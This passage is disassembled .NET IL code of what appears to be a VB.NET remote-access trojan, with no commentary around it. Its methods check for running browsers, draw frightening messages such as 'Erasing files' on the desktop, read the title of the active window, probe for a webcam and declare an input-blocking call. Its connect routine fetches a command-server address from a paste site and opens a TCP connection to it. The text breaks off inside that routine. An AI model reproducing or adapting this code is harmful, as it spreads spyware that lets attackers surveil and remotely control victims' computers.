    IL_0233:  add.ovf
    IL_0234:  stloc.s    V_26
    IL_0236:  ldloc.s    V_26
    IL_0238:  ldloc.s    V_25
    IL_023a:  ldlen
    IL_023b:  conv.i4
    IL_023c:  blt.s      IL_0225

    IL_023e:  ldstr      "Chromium"
    IL_0243:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0248:  stloc.s    V_27
    IL_024a:  ldc.i4.0
    IL_024b:  stloc.s    V_28
    IL_024d:  br.s       IL_0260

    IL_024f:  ldloc.s    V_27
    IL_0251:  ldloc.s    V_28
    IL_0253:  ldelem.ref
    IL_0254:  pop
    IL_0255:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_025a:  ldloc.s    V_28
    IL_025c:  ldc.i4.1
    IL_025d:  add.ovf
    IL_025e:  stloc.s    V_28
    IL_0260:  ldloc.s    V_28
    IL_0262:  ldloc.s    V_27
    IL_0264:  ldlen
    IL_0265:  conv.i4
    IL_0266:  blt.s      IL_024f

    IL_0268:  ldstr      "Avant"
    IL_026d:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_0272:  stloc.s    V_29
    IL_0274:  ldc.i4.0
    IL_0275:  stloc.s    V_30
    IL_0277:  br.s       IL_028a

    IL_0279:  ldloc.s    V_29
    IL_027b:  ldloc.s    V_30
    IL_027d:  ldelem.ref
    IL_027e:  pop
    IL_027f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0284:  ldloc.s    V_30
    IL_0286:  ldc.i4.1
    IL_0287:  add.ovf
    IL_0288:  stloc.s    V_30
    IL_028a:  ldloc.s    V_30
    IL_028c:  ldloc.s    V_29
    IL_028e:  ldlen
    IL_028f:  conv.i4
    IL_0290:  blt.s      IL_0279

    IL_0292:  ldstr      "Slimbrowser"
    IL_0297:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_029c:  stloc.s    V_31
    IL_029e:  ldc.i4.0
    IL_029f:  stloc.s    V_32
    IL_02a1:  br.s       IL_02b4

    IL_02a3:  ldloc.s    V_31
    IL_02a5:  ldloc.s    V_32
    IL_02a7:  ldelem.ref
    IL_02a8:  pop
    IL_02a9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_02ae:  ldloc.s    V_32
    IL_02b0:  ldc.i4.1
    IL_02b1:  add.ovf
    IL_02b2:  stloc.s    V_32
    IL_02b4:  ldloc.s    V_32
    IL_02b6:  ldloc.s    V_31
    IL_02b8:  ldlen
    IL_02b9:  conv.i4
    IL_02ba:  blt.s      IL_02a3

    IL_02bc:  ldstr      "QtWeb"
    IL_02c1:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_02c6:  stloc.s    V_33
    IL_02c8:  ldc.i4.0
    IL_02c9:  stloc.s    V_34
    IL_02cb:  br.s       IL_02de

    IL_02cd:  ldloc.s    V_33
    IL_02cf:  ldloc.s    V_34
    IL_02d1:  ldelem.ref
    IL_02d2:  pop
    IL_02d3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_02d8:  ldloc.s    V_34
    IL_02da:  ldc.i4.1
    IL_02db:  add.ovf
    IL_02dc:  stloc.s    V_34
    IL_02de:  ldloc.s    V_34
    IL_02e0:  ldloc.s    V_33
    IL_02e2:  ldlen
    IL_02e3:  conv.i4
    IL_02e4:  blt.s      IL_02cd

    IL_02e6:  ldstr      "OperaMini"
    IL_02eb:  call       class [System]System.Diagnostics.Process[] [System]System.Diagnostics.Process::GetProcessesByName(string)
    IL_02f0:  stloc.s    V_35
    IL_02f2:  ldc.i4.0
    IL_02f3:  stloc.s    V_36
    IL_02f5:  br.s       IL_0308

    IL_02f7:  ldloc.s    V_35
    IL_02f9:  ldloc.s    V_36
    IL_02fb:  ldelem.ref
    IL_02fc:  pop
    IL_02fd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_0302:  ldloc.s    V_36
    IL_0304:  ldc.i4.1
    IL_0305:  add.ovf
    IL_0306:  stloc.s    V_36
    IL_0308:  ldloc.s    V_36
    IL_030a:  ldloc.s    V_35
    IL_030c:  ldlen
    IL_030d:  conv.i4
    IL_030e:  blt.s      IL_02f7

    IL_0310:  ldc.i4.s   50
    IL_0312:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0317:  ret

    IL_0318:  ldloc.0
    IL_0319:  callvirt   instance void [mscorlib]System.Threading.Thread::Abort()
    IL_031e:  ret
  } // end of method OK::bac

  .method public static string  HorrorText() cil managed
  {
    // Code size       530 (0x212)
    .maxstack  9
    .locals init (string V_0,
             class [mscorlib]System.Random V_1,
             int32 V_2,
             valuetype [System.Drawing]System.Drawing.Rectangle V_3,
             object V_4,
             string[] V_5,
             class [System.Drawing]System.Drawing.Font V_6,
             class [System.Drawing]System.Drawing.SolidBrush V_7,
             int32 V_8,
             int32 V_9,
             class [System.Drawing]System.Drawing.StringFormat V_10,
             string& V_11,
             object[] V_12,
             bool[] V_13)
    IL_0000:  newobj     instance void [mscorlib]System.Random::.ctor()
    IL_0005:  stloc.1
    IL_0006:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
    IL_000b:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
    IL_0010:  stloc.3
    IL_0011:  ldloca.s   V_3
    IL_0013:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
    IL_0018:  stloc.2
    IL_0019:  call       native int j.OK::GetDesktopWindow()
    IL_001e:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromHwnd(native int)
    IL_0023:  stloc.s    V_4
    .try
    {
      IL_0025:  ldc.i4.5
      IL_0026:  newarr     [mscorlib]System.String
      IL_002b:  dup
      IL_002c:  ldc.i4.0
      IL_002d:  ldstr      "Time to format"
      IL_0032:  stelem.ref
      IL_0033:  dup
      IL_0034:  ldc.i4.1
      IL_0035:  ldstr      "I am in your Computer"
      IL_003a:  stelem.ref
      IL_003b:  dup
      IL_003c:  ldc.i4.2
      IL_003d:  ldstr      "OMG"
      IL_0042:  stelem.ref
      IL_0043:  dup
      IL_0044:  ldc.i4.3
      IL_0045:  ldstr      "Erasing files"
      IL_004a:  stelem.ref
      IL_004b:  dup
      IL_004c:  ldc.i4.4
      IL_004d:  ldstr      "Your system is now mine"
      IL_0052:  stelem.ref
      IL_0053:  stloc.s    V_5
      IL_0055:  ldstr      "Arial"
      IL_005a:  ldloc.1
      IL_005b:  ldc.i4.s   10
      IL_005d:  ldc.i4.s   70
      IL_005f:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                        int32)
      IL_0064:  conv.r4
      IL_0065:  newobj     instance void [System.Drawing]System.Drawing.Font::.ctor(string,
                                                                                    float32)
      IL_006a:  stloc.s    V_6
      IL_006c:  call       valuetype [System.Drawing]System.Drawing.Color [System.Drawing]System.Drawing.Color::get_Red()
      IL_0071:  newobj     instance void [System.Drawing]System.Drawing.SolidBrush::.ctor(valuetype [System.Drawing]System.Drawing.Color)
      IL_0076:  stloc.s    V_7
      IL_0078:  ldloc.1
      IL_0079:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_007e:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0083:  stloc.3
      IL_0084:  ldloca.s   V_3
      IL_0086:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_008b:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_0090:  stloc.s    V_8
      IL_0092:  ldloc.1
      IL_0093:  ldloc.2
      IL_0094:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_0099:  stloc.s    V_9
      IL_009b:  newobj     instance void [System.Drawing]System.Drawing.StringFormat::.ctor()
      IL_00a0:  stloc.s    V_10
      IL_00a2:  ldloc.s    V_10
      IL_00a4:  ldc.i4.1
      IL_00a5:  callvirt   instance void [System.Drawing]System.Drawing.StringFormat::set_FormatFlags(valuetype [System.Drawing]System.Drawing.StringFormatFlags)
      IL_00aa:  ldloc.1
      IL_00ab:  ldc.i4.5
      IL_00ac:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_00b1:  brtrue     IL_01fd

      IL_00b6:  ldloc.s    V_4
      IL_00b8:  ldnull
      IL_00b9:  ldstr      "DrawString"
      IL_00be:  ldc.i4.6
      IL_00bf:  newarr     [mscorlib]System.Object
      IL_00c4:  dup
      IL_00c5:  ldc.i4.0
      IL_00c6:  ldloc.s    V_5
      IL_00c8:  ldloc.1
      IL_00c9:  ldc.i4.4
      IL_00ca:  callvirt   instance int32 [mscorlib]System.Random::Next(int32)
      IL_00cf:  ldelema    [mscorlib]System.String
      IL_00d4:  dup
      IL_00d5:  stloc.s    V_11
      IL_00d7:  ldind.ref
      IL_00d8:  stelem.ref
      IL_00d9:  dup
      IL_00da:  ldc.i4.1
      IL_00db:  ldloc.s    V_6
      IL_00dd:  stelem.ref
      IL_00de:  dup
      IL_00df:  ldc.i4.2
      IL_00e0:  ldloc.s    V_7
      IL_00e2:  stelem.ref
      IL_00e3:  dup
      IL_00e4:  ldc.i4.3
      IL_00e5:  ldloc.s    V_8
      IL_00e7:  box        [mscorlib]System.Int32
      IL_00ec:  stelem.ref
      IL_00ed:  dup
      IL_00ee:  ldc.i4.4
      IL_00ef:  ldloc.s    V_9
      IL_00f1:  box        [mscorlib]System.Int32
      IL_00f6:  stelem.ref
      IL_00f7:  dup
      IL_00f8:  ldc.i4.5
      IL_00f9:  ldloc.s    V_10
      IL_00fb:  stelem.ref
      IL_00fc:  dup
      IL_00fd:  stloc.s    V_12
      IL_00ff:  ldnull
      IL_0100:  ldnull
      IL_0101:  ldc.i4.6
      IL_0102:  newarr     [mscorlib]System.Boolean
      IL_0107:  dup
      IL_0108:  ldtoken    field valuetype '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=6' '<PrivateImplementationDetails>'::'03C7F4E8FB359AEC0EEF0814B66A704FC43FB3A8'
      IL_010d:  call       void [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::InitializeArray(class [mscorlib]System.Array,
                                                                                                          valuetype [mscorlib]System.RuntimeFieldHandle)
      IL_0112:  dup
      IL_0113:  stloc.s    V_13
      IL_0115:  ldc.i4.1
      IL_0116:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_011b:  pop
      IL_011c:  ldloc.s    V_13
      IL_011e:  ldc.i4.0
      IL_011f:  ldelem.u1
      IL_0120:  brfalse.s  IL_0142

      IL_0122:  ldloc.s    V_11
      IL_0124:  ldloc.s    V_12
      IL_0126:  ldc.i4.0
      IL_0127:  ldelem.ref
      IL_0128:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_012d:  ldtoken    [mscorlib]System.String
      IL_0132:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_0137:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_013c:  castclass  [mscorlib]System.String
      IL_0141:  stind.ref
      IL_0142:  ldloc.s    V_13
      IL_0144:  ldc.i4.1
      IL_0145:  ldelem.u1
      IL_0146:  brfalse.s  IL_0167

      IL_0148:  ldloc.s    V_12
      IL_014a:  ldc.i4.1
      IL_014b:  ldelem.ref
      IL_014c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0151:  ldtoken    [System.Drawing]System.Drawing.Font
      IL_0156:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_015b:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_0160:  castclass  [System.Drawing]System.Drawing.Font
      IL_0165:  stloc.s    V_6
      IL_0167:  ldloc.s    V_13
      IL_0169:  ldc.i4.2
      IL_016a:  ldelem.u1
      IL_016b:  brfalse.s  IL_018c

      IL_016d:  ldloc.s    V_12
      IL_016f:  ldc.i4.2
      IL_0170:  ldelem.ref
      IL_0171:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0176:  ldtoken    [System.Drawing]System.Drawing.SolidBrush
      IL_017b:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_0180:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_0185:  castclass  [System.Drawing]System.Drawing.SolidBrush
      IL_018a:  stloc.s    V_7
      IL_018c:  ldloc.s    V_13
      IL_018e:  ldc.i4.3
      IL_018f:  ldelem.u1
      IL_0190:  brfalse.s  IL_01b1

      IL_0192:  ldloc.s    V_12
      IL_0194:  ldc.i4.3
      IL_0195:  ldelem.ref
      IL_0196:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_019b:  ldtoken    [mscorlib]System.Int32
      IL_01a0:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_01a5:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_01aa:  unbox.any  [mscorlib]System.Int32
      IL_01af:  stloc.s    V_8
      IL_01b1:  ldloc.s    V_13
      IL_01b3:  ldc.i4.4
      IL_01b4:  ldelem.u1
      IL_01b5:  brfalse.s  IL_01d6

      IL_01b7:  ldloc.s    V_12
      IL_01b9:  ldc.i4.4
      IL_01ba:  ldelem.ref
      IL_01bb:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_01c0:  ldtoken    [mscorlib]System.Int32
      IL_01c5:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_01ca:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_01cf:  unbox.any  [mscorlib]System.Int32
      IL_01d4:  stloc.s    V_9
      IL_01d6:  ldloc.s    V_13
      IL_01d8:  ldc.i4.5
      IL_01d9:  ldelem.u1
      IL_01da:  brtrue.s   IL_01de

      IL_01dc:  leave.s    IL_0210

      IL_01de:  ldloc.s    V_12
      IL_01e0:  ldc.i4.5
      IL_01e1:  ldelem.ref
      IL_01e2:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_01e7:  ldtoken    [System.Drawing]System.Drawing.StringFormat
      IL_01ec:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_01f1:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_01f6:  castclass  [System.Drawing]System.Drawing.StringFormat
      IL_01fb:  stloc.s    V_10
      IL_01fd:  leave.s    IL_0210

    }  // end .try
    finally
    {
      IL_01ff:  ldloc.s    V_4
      IL_0201:  brfalse.s  IL_020f

      IL_0203:  ldloc.s    V_4
      IL_0205:  castclass  [mscorlib]System.IDisposable
      IL_020a:  callvirt   instance void [mscorlib]System.IDisposable::Dispose()
      IL_020f:  endfinally
    }  // end handler
    IL_0210:  ldloc.0
    IL_0211:  ret
  } // end of method OK::HorrorText

  .method public static string  ACT() cil managed
  {
    // Code size       108 (0x6c)
    .maxstack  3
    .locals init (string V_0,
             string V_1,
             native int V_2,
             string V_3,
             class [mscorlib]System.Exception V_4)
    .try
    {
      IL_0000:  call       native int j.OK::GetForegroundWindow()
      IL_0005:  stloc.2
      IL_0006:  ldloc.2
      IL_0007:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_000c:  call       bool [mscorlib]System.IntPtr::op_Equality(native int,
                                                                     native int)
      IL_0011:  brfalse.s  IL_001b

      IL_0013:  ldstr      ""
      IL_0018:  stloc.0
      IL_0019:  leave.s    IL_006a

      IL_001b:  ldloc.2
      IL_001c:  call       int64 [mscorlib]System.IntPtr::op_Explicit(native int)
      IL_0021:  call       int32 j.OK::GetWindowTextLength(int64)
      IL_0026:  ldc.i4.1
      IL_0027:  add.ovf
      IL_0028:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_002d:  stloc.3
      IL_002e:  ldloc.2
      IL_002f:  ldloca.s   V_3
      IL_0031:  ldloc.3
      IL_0032:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0037:  call       int32 j.OK::GetWindowText(native int,
                                                     string&,
                                                     int32)
      IL_003c:  pop
      IL_003d:  ldloca.s   V_3
      IL_003f:  call       string j.OK::ENB(string&)
      IL_0044:  stloc.1
      IL_0045:  leave.s    IL_0068

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0047:  dup
      IL_0048:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004d:  stloc.s    V_4
      IL_004f:  ldloc.s    V_4
      IL_0051:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0056:  ldstr      ""
      IL_005b:  stloc.1
      IL_005c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0061:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0066:  leave.s    IL_0068

    }  // end handler
    IL_0068:  ldloc.1
    IL_0069:  stloc.0
    IL_006a:  ldloc.0
    IL_006b:  ret
  } // end of method OK::ACT

  .method public static string  BS(uint8[]& B) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0005:  ldarg.0
    IL_0006:  ldind.ref
    IL_0007:  callvirt   instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
    IL_000c:  ret
  } // end of method OK::BS

  .method public static bool  Cam() cil managed
  {
    // Code size       74 (0x4a)
    .maxstack  5
    .locals init (bool V_0,
             int32 V_1,
             string V_2,
             string V_3,
             class [mscorlib]System.Exception V_4)
    .try
    {
      IL_0000:  ldc.i4.0
      IL_0001:  stloc.1
      IL_0002:  ldnull
      IL_0003:  stloc.2
      IL_0004:  ldloc.1
      IL_0005:  conv.ovf.i2
      IL_0006:  ldc.i4.s   100
      IL_0008:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_000d:  stloc.3
      IL_000e:  ldloca.s   V_3
      IL_0010:  ldc.i4.s   100
      IL_0012:  ldloca.s   V_2
      IL_0014:  ldc.i4.s   100
      IL_0016:  call       bool j.OK::capGetDriverDescriptionA(int16,
                                                               string&,
                                                               int32,
                                                               string&,
                                                               int32)
      IL_001b:  brfalse.s  IL_0021

      IL_001d:  ldc.i4.1
      IL_001e:  stloc.0
      IL_001f:  leave.s    IL_0048

      IL_0021:  ldloc.1
      IL_0022:  ldc.i4.1
      IL_0023:  add.ovf
      IL_0024:  stloc.1
      IL_0025:  ldloc.1
      IL_0026:  ldc.i4.4
      IL_0027:  ble.s      IL_0002

      IL_0029:  leave.s    IL_0046

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002b:  dup
      IL_002c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0031:  stloc.s    V_4
      IL_0033:  ldloc.s    V_4
      IL_0035:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_003f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0044:  leave.s    IL_0046

    }  // end handler
    IL_0046:  ldc.i4.0
    IL_0047:  stloc.0
    IL_0048:  ldloc.0
    IL_0049:  ret
  } // end of method OK::Cam

  .method private static pinvokeimpl("user32.dll" winapi) 
          bool  marshal( bool)  BlockInput(bool  marshal( bool) fBlockIt) cil managed preservesig
  {
  }
  .method public static pinvokeimpl("avicap32.dll" nomangle ansi lasterr winapi) 
          bool  capGetDriverDescriptionA(int16 wDriver,
                                         string&  marshal( byvalstr) lpszName,
                                         int32 cbName,
                                         string&  marshal( byvalstr) lpszVer,
                                         int32 cbVer) cil managed preservesig
  {
  }
  .method private static bool  CompDir(class [mscorlib]System.IO.FileInfo F1,
                                       class [mscorlib]System.IO.FileInfo F2) cil managed
  {
    // Code size       121 (0x79)
    .maxstack  3
    .locals init (bool V_0,
             class [mscorlib]System.IO.DirectoryInfo V_1,
             class [mscorlib]System.IO.DirectoryInfo V_2)
    IL_0000:  ldarg.0
    IL_0001:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0006:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_000b:  ldarg.1
    IL_000c:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0011:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0016:  ldc.i4.0
    IL_0017:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_001c:  brtrue.s   IL_0075

    IL_001e:  ldarg.0
    IL_001f:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_0024:  stloc.1
    IL_0025:  ldarg.1
    IL_0026:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_002b:  stloc.2
    IL_002c:  ldloc.1
    IL_002d:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0032:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0037:  ldloc.2
    IL_0038:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_003d:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0042:  ldc.i4.0
    IL_0043:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0048:  brfalse.s  IL_004e

    IL_004a:  ldc.i4.0
    IL_004b:  stloc.0
    IL_004c:  br.s       IL_0077

    IL_004e:  ldloc.1
    IL_004f:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_0054:  stloc.1
    IL_0055:  ldloc.2
    IL_0056:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_005b:  stloc.2
    IL_005c:  ldloc.1
    IL_005d:  ldnull
    IL_005e:  ceq
    IL_0060:  ldloc.2
    IL_0061:  ldnull
    IL_0062:  ceq
    IL_0064:  and
    IL_0065:  brfalse.s  IL_006b

    IL_0067:  ldc.i4.1
    IL_0068:  stloc.0
    IL_0069:  br.s       IL_0077

    IL_006b:  ldloc.1
    IL_006c:  brtrue.s   IL_0072

    IL_006e:  ldc.i4.0
    IL_006f:  stloc.0
    IL_0070:  br.s       IL_0077

    IL_0072:  ldloc.2
    IL_0073:  brtrue.s   IL_002c

    IL_0075:  ldc.i4.0
    IL_0076:  stloc.0
    IL_0077:  ldloc.0
    IL_0078:  ret
  } // end of method OK::CompDir

  .method public static bool  connect() cil managed
  {
    // Code size       744 (0x2e8)
    .maxstack  5
    .locals init (string[] V_0,
             int32 V_1,
             int32 V_2,
             object V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             string V_7,
             string V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10)
    IL_0000:  ldsfld     string j.OK::PASTEE
    IL_0005:  ldstr      "Enabled"
    IL_000a:  ldc.i4.0
    IL_000b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0010:  brtrue.s   IL_0054

    IL_0012:  newobj     instance void [System]System.Net.WebClient::.ctor()
    IL_0017:  ldsfld     string j.OK::PASTEBIN
    IL_001c:  call       instance string [System]System.Net.WebClient::DownloadString(string)
    IL_0021:  ldc.i4.1
    IL_0022:  newarr     [mscorlib]System.Char
    IL_0027:  dup
    IL_0028:  ldc.i4.0
    IL_0029:  ldc.i4.s   58
    IL_002b:  stelem.i2
    IL_002c:  callvirt   instance string[] [mscorlib]System.String::Split(char[])
    IL_0031:  stloc.0
    IL_0032:  ldloc.0
    IL_0033:  ldlen
    IL_0034:  conv.i4
    IL_0035:  ldc.i4.1
    IL_0036:  sub.ovf
    IL_0037:  stloc.2
    IL_0038:  ldc.i4.0
    IL_0039:  stloc.1
    IL_003a:  br.s       IL_0050

    IL_003c:  ldloc.0
    IL_003d:  ldc.i4.0
    IL_003e:  ldelem.ref
    IL_003f:  stsfld     string j.OK::H
    IL_0044:  ldloc.0
    IL_0045:  ldc.i4.1
    IL_0046:  ldelem.ref
    IL_0047:  stsfld     string j.OK::P
    IL_004c:  ldloc.1
    IL_004d:  ldc.i4.1
    IL_004e:  add.ovf
    IL_004f:  stloc.1
    IL_0050:  ldloc.1
    IL_0051:  ldloc.2
    IL_0052:  ble.s      IL_003c

    IL_0054:  ldc.i4.0
    IL_0055:  stsfld     bool j.OK::Cn
    IL_005a:  ldc.i4     0x7d0
    IL_005f:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0064:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_0069:  stloc.3
    IL_006a:  ldloc.3
    IL_006b:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
    .try
    {
      .try
      {
        IL_0070:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_0075:  brfalse.s  IL_00a4

        .try
        {
          IL_0077:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
          IL_007c:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
          IL_0081:  ldnull
          IL_0082:  stsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
          IL_0087:  leave.s    IL_00a4

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0089:  dup
          IL_008a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_008f:  stloc.s    V_4
          IL_0091:  ldloc.s    V_4
          IL_0093:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0098:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_009d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_00a2:  leave.s    IL_00a4

        }  // end handler
        IL_00a4:  nop
        .try
        {
          IL_00a5:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
          IL_00aa:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
          IL_00af:  leave.s    IL_00cc

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_00b1:  dup
          IL_00b2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_00b7:  stloc.s    V_5
          IL_00b9:  ldloc.s    V_5
          IL_00bb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_00c0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_00c5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_00ca:  leave.s    IL_00cc

        }  // end handler
        IL_00cc:  leave.s    IL_00e9

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_00ce:  dup
        IL_00cf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00d4:  stloc.s    V_6
